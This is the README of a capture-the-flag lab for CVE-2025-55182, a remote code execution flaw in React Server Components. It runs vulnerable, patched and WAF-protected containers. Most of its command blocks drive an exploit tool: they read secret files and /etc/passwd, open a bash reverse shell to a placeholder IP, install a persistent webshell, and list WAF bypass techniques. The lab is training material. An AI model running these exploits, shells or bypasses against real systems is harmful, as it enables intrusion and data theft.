# CVE-2025-55182 Lab Environment

A comprehensive lab environment for testing and learning about CVE-2025-55182 (React Server Components Remote Code Execution).

## Quick Start

```bash
cd lab
docker-compose up --build
```

## Services

| Service | Port | Framework | Status | Description |
|---------|------|-----------|--------|-------------|
| Vulnerable | 3011 | Next.js | **EXPLOITABLE** | Vulnerable Next.js app (React 19.2.0 + Next.js 15.4.0) |
| Patched | 3012 | Next.js | Secure | Patched Next.js app (React 19.2.1 + Next.js 15.4.8) |
| WAF | 3013 | Next.js | Protected | ModSecurity WAF protecting vulnerable instance |
| Waku | 3014 | Waku | **EXPLOITABLE** | Waku app (React 19.2.0 + Waku 0.27.1) - requires path encoding |
| React Router | 3015 | Express + RSDW | **EXPLOITABLE** | Standalone react-server-dom-webpack (ESM) |
| Dashboard | 8080 | - | - | Attack logging and monitoring dashboard |

### Exploitation Notes

**Next.js (port 3011)**: Primary target. All exploit variants work. Use `Next-Action` header.

**Waku (port 3014)**: **Confirmed exploitable!** Waku has a path validation layer (`decodeRscPath`) that
requires paths to end with `.txt`. The exploit path is `/RSC/F/{file}/{name}.txt` for function calls.
Key differences from Next.js:
- Path must match `/RSC/F/{something}/{action}.txt` format
- Waku doesn't expose error digest in HTTP response (no X-Action-Redirect)
- Output exfiltration requires file write or out-of-band methods (reverse shell, DNS, etc.)

**React Router (port 3015)**: This instance uses `react-server-dom-webpack@19.2.0` directly with
`decodeReplyFromBusboy` in an ESM environment. **Confirmed exploitable!** The key differences from Next.js:
- Uses `process.getBuiltinModule('child_process')` for ESM compatibility (Node.js 20.16+)
- Response exfiltrated via X-Action-Redirect header
- Demonstrates that CVE-2025-55182 affects standalone `react-server-dom-webpack` usage, not just Next.js

## CTF Flags

### Next.js Flags (port 3011)
1. **Flag 1** - Environment Variables
   ```bash
   python ../cli/react2shell.py http://localhost:3011 -c "env | grep FLAG"
   ```

2. **Flag 2** - Root Flag
   ```bash
   python ../cli/react2shell.py http://localhost:3011 -c "cat /root/flag.txt"
   ```

3. **Flag 3** - Secret Directory
   ```bash
   python ../cli/react2shell.py http://localhost:3011 -c "cat /app/secret/flag.txt"
   ```

### Waku Flag (port 3014)
Waku RCE works but output isn't returned via HTTP. Use file write + container access or reverse shell:
```bash
# Execute command (writes to /tmp/r2s_out.txt inside container)
python ../cli/react2shell.py http://localhost:3014 -F waku -c "cat /app/flag.txt"

# Read output from container
docker exec react2shell-waku cat /tmp/r2s_out.txt

# Or use reverse shell for interactive access
nc -lvnp 4444 &
python ../cli/react2shell.py http://localhost:3014 -F waku -c "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
```

### React Router Flag (port 3015)
```bash
python ../cli/react2shell.py http://localhost:3015 -F react-router -c "cat /app/flag.txt"
```

## Testing Commands

### Scan for Vulnerability
```bash
# Test vulnerable Next.js instance
python ../cli/react2shell.py http://localhost:3011

# Test patched instance (should timeout/fail)
python ../cli/react2shell.py http://localhost:3012

# Test WAF-protected instance
python ../cli/react2shell.py http://localhost:3013

# Test Waku instance
python ../cli/react2shell.py http://localhost:3014 -F waku

# Test React Router instance
python ../cli/react2shell.py http://localhost:3015 -F react-router
```

### Framework Detection
```bash
# Auto-detect framework
python ../cli/react2shell.py http://localhost:3011 --detect

# Enumerate RSC endpoints
python ../cli/react2shell.py http://localhost:3011 -E -v
```

### Execute Commands
```bash
# Next.js
python ../cli/react2shell.py http://localhost:3011 -c "id"
python ../cli/react2shell.py http://localhost:3011 -c "whoami"
python ../cli/react2shell.py http://localhost:3011 -c "ls -la /"

# Waku (uses different payload)
python ../cli/react2shell.py http://localhost:3014 -F waku -c "id"

# React Router
python ../cli/react2shell.py http://localhost:3015 -F react-router -c "id"
```

### WAF Bypass Testing
```bash
# Try WAF bypass with junk data padding
python ../cli/react2shell.py http://localhost:3013 -c "id" -w
```

### Reverse Shell
```bash
# Start listener
nc -lvnp 4444

# Send reverse shell
python ../cli/react2shell.py http://localhost:3011 -r -l YOUR_IP -p 4444
```

### Webshell Installation
```bash
# Install persistent webshell on port 1337
python ../cli/react2shell.py http://localhost:3011 --webshell secretpass

# Access webshell via curl (URL encode spaces with %20)
curl 'http://localhost:1337/?p=secretpass&cmd=id'
curl 'http://localhost:1337/?p=secretpass&cmd=cat%20/etc/passwd'
curl 'http://localhost:1337/?p=secretpass&cmd=ls%20-la%20/'

# Or use --data-urlencode for complex commands
curl -G 'http://localhost:1337/' --data-urlencode 'p=secretpass' --data-urlencode 'cmd=ps aux | grep node'
```

## Architecture

```
┌───────────────────────────────────────────────────────────────────────────┐
│                            Docker Network                                  │
├───────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐ ┌─────────────┐          │
│  │  Next.js    │ │   Patched   │ │    Waku     │ │Express+RSDW │          │
│  │   :3011     │ │   :3012     │ │   :3014     │ │   :3015     │          │
│  │             │ │             │ │             │ │             │          │
│  │ React 19.2.0│ │ React 19.2.1│ │ React 19.2.0│ │ RSDW 19.2.0 │          │
│  │ Next  15.4.0│ │ Next  15.4.8│ │ Waku 0.27.1 │ │  (ESM mode) │          │
│  │             │ │             │ │             │ │             │          │
│  │ [VULNERABLE]│ │  [SECURE]   │ │ [VULNERABLE]│ │ [VULNERABLE]│          │
│  └─────────────┘ └─────────────┘ └─────────────┘ └─────────────┘          │
│                                                                            │
│  ┌─────────────┐ ┌─────────────────────────────────────────────┐          │
│  │     WAF     │ │                 Dashboard :8080              │          │
│  │   :3013     │ │           Attack logging and monitoring      │          │
│  │ ModSecurity │ └─────────────────────────────────────────────┘          │
│  └─────────────┘                                                           │
│                                                                            │
└───────────────────────────────────────────────────────────────────────────┘
```

## WAF Rules

The WAF includes custom ModSecurity rules that detect:

- RSC Accept headers (`text/x-component`)
- RSC-Action / Next-Action / x-action headers
- Prototype pollution patterns
- React Flight payload markers
- Command injection patterns
- Reverse shell patterns

Bypass techniques to explore:
- Case variations (next-ACTION, NEXT-action)
- Unicode/URL encoding
- Junk data padding (exceed inspection limits)
- Chunked transfer encoding
- Content-Type manipulation

## Stopping the Lab

```bash
docker-compose down
```

To remove all data:
```bash
docker-compose down -v --rmi all
```

## Technical Documentation

For detailed technical information about the vulnerability, exploitation techniques, and payload structure, see:

**[docs/README.md](../docs/README.md)** - Comprehensive technical deep dive including:
- Vulnerability root cause analysis
- Payload structure breakdown
- ESM vs CommonJS differences
- Framework-specific exploitation (Next.js, React Router, Waku)
- Output exfiltration methods

## For Authorized Security Testing Only

This lab is designed for educational purposes and authorized penetration testing practice. Do not use these techniques against systems without explicit permission.
